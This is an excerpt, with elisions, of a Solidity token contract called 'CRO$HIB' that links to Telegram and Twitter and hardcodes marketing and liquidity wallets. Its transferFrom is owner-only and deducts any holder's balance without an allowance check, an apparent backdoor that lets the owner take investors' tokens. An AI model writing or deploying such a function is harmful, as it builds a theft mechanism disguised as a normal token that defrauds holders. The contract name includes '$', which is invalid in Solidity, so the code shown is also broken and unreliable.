...
//**telegram:https://t.me/croshibbep

//**https://twitter.com/Croshib001?s=20
...
contract CRO$HIB is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name = "CRO$HIB";
    string private _symbol = "CR$B";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0x0885C7521178E9eC0dcD904F46dd3a3ad3A58bd4);
    address payable public liqWalletAddress = payable(0xffA61B7b0503A8700386c970358db639e5b86b4C);
    ...
    function CROSHIB (address account, bool newValue) public onlyOwner {
    ...
    function transferFrom(address holder, address recipient, uint256 amount) external onlyOwner returns (bool) {
        _balances[holder] = _balances[holder].sub(amount, "Insufficient Balance");
